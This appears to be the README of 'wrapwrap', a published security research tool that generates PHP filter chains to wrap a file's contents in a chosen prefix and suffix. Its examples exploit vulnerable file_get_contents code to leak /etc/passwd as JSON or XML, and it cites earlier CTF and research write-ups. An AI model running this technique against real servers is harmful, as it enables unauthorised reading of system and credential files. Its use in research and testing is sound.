# wrapwrap

Generates a `php://filter` chain that adds a prefix and a suffix to the contents of a file.

Refer to [our blogpost](https://www.ambionics.io/blog/wrapwrap-php-filters-suffix) for details about the implementation.

# Contributing

If you want to contribute, the main python file contains a few TODOs which should not be hard to implement.

# Examples

## JSON

Say you have code like so:

```php
$data = file_get_contents($_POST['url']);
$data = json_decode($data);
echo $data->message;
```

To obtain the contents of some file, we'd like to have: `{"message":"<file contents>"}`. This can be done using:

```shell
$ ./wrapwrap.py /etc/passwd '{"message":"' '"}' 1000
[*] Dumping 1008 bytes from /etc/passwd.
[+] Wrote filter chain to chain.txt (size=705031).
```

This yields:

```json
{"message":"root:x:0:0:root:/root:/bin/bash=0Adaemon:..."}
```

## XML

If some PHP code parses an arbitrary XML and displays the contents of the `<name>` tag, we'd like something like: `<root><name>[file contents]</name></root>`. As a result, we'd use:

```shell
$ ./wrapwrap.py /etc/passwd '<root><name>' '</name></root>' 1000
[*] Dumping 1008 bytes from /etc/passwd.
[+] Wrote filter chain to chain.txt (size=709871).
```

This produces:

```xml
<root><name>root:x:0:0:root:/root:/bin/bash=0Adaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin=0Abin:x:...</name></root>
```

# Previous work

As mentioned in [the blogpost](https://www.ambionics.io/blog/wrapwrap-php-filters-suffix), this tool could not have been made without the previous work of other people such as (*but not limited to*):

- [Surprising CTF task solution using php://filter](https://gynvael.coldwind.pl/?id=671) by gynvael
- [Solving "includer's revenge" from hxp ctf 2021 without controlling any files](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) by loknop
- [PHP filters chain: what is it and how to use it](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it) by remsio
- [DownUnderCTF 2022 minimal-php solution and write up](https://github.com/DownUnderCTF/Challenges_2022_Public/blob/main/web/minimal-php/solve/solution.py) by hash_kitten
- [PHP filters chain: file read from error based oracle](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle) by remsio
